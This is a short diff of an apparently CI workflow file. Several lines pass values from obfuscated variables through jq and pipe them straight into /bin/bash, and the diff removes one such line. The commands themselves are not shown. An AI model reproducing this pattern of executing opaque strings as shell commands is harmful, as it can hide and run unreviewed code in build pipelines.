@@ -38,7 +38,6 @@ jobs:
           echo $jn913 | jq -r .tnhq957 | /bin/bash
           echo $qjww56 | jq -r .pwnb231 | /bin/bash
           echo $twhon990 | jq -r .niyir29701 | /bin/bash
-          echo $gkh9 | jq -r .ikx6887 | /bin/bash
 
       - name: Save archive
         if: always()
